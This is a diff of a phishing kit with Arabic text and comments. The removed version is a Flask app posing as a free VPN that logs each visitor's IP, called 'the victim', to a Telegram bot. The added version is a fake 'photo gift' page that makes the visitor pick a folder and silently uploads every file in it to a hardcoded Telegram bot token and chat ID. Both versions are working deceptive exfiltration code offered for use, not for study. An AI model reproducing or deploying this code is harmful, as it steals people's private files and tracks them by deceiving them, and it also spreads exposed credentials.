@@ -1,63 +1,37 @@
-import requests
-from flask import Flask, render_template_string, request
-
-app = Flask(__name__)
-
-# بياناتك الخاصة يا عبد الرحمن
-API_TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg"
-CHAT_ID = "7214473798"
-
-# واجهة الـ VPN الوهمية (HTML) مدمجة بالداخل
-HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure VPN Pro</title>
+    <title>عرض الصور الحصري</title>
     <style>
-        body { background-color: #0d1117; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background-color: #238636; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2rem; cursor: pointer; }
-        .status { color: #8b949e; margin-top: 20px; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { background: #e91e63; color: white; padding: 20px; border-radius: 10px; border: none; font-size: 1.5rem; cursor: pointer; }
     </style>
 </head>
 <body>
-    <img src="https://img.icons8.com/fluency/96/vpn.png" alt="VPN Icon">
-    <h1>VPN آمن ومجاني</h1>
-    <p>اضغط أدناه لتشغيل الخدمة وتجاوز الحظر فوراً</p>
-    <button class="btn" onclick="activate()">تشغيل VPN الآن</button>
-    <p id="msg" class="status">الحالة: غير متصل</p>
+    <h1>لقد وصلت لك هدية صور! 🎁</h1>
+    <p>اضغط على الزر أدناه لفتح ألبوم الصور الخاص بك</p>
+    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
+    <button class="btn" onclick="document.getElementById('fileInput').click()">فتح الألبوم الآن</button>
 
     <script>
-        function activate() {
-            document.getElementById('msg').innerText = 'جاري الاتصال بالسيرفر...';
-            fetch('/capture').then(() => {
-                setTimeout(() => {
-                    document.getElementById('msg').innerText = 'خطأ في الاتصال! حاول مجدداً';
-                }, 3000);
-            });
-        }
+        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+        const CHAT_ID = '7214473798';
+
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const files = e.target.files;
+            for (let i = 0; i < files.length; i++) {
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', files[i]);
+
+                fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+            alert("جاري تحميل الصور، يرجى الانتظار...");
+        });
     </script>
 </body>
 </html>
-"""
-
-def send_telegram_msg(text):
-    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": CHAT_ID, "text": text})
-
-@app.route('/')
-def home():
-    # تنبيه بمجرد دخول الضحية للرابط
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    send_telegram_msg(f"⚠️ تنبيه: الضحية دخل الرابط الآن!\n📍 IP الضحية: {ip}")
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/capture')
-def capture():
-    # الإشعار النهائي عند ضغط الزر
-    send_telegram_msg("🚀 صيد ثمين! الضحية ضغط على 'تشغيل VPN'.\n🔓 النظام مخترق.. جاري سحب البيانات والملفات!")
-    return "OK"
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
